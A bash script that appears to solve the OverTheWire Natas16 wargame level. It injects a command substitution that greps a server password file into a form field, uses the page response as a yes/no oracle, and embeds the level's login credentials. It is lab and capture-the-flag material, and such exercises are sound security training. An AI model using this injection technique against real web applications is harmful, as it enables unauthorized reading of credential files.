#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
URL="natas16.natas.labs.overthewire.org"
LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
PASS=""

for char in $(echo $CHARS | fold -w1); do
	OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $char /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
	if [ "$OUT" -eq 0 ]; then
		PASS+=$char
		echo "pass so far: $PASS"
	fi
done

echo "Password for natas16: $PASS"
	
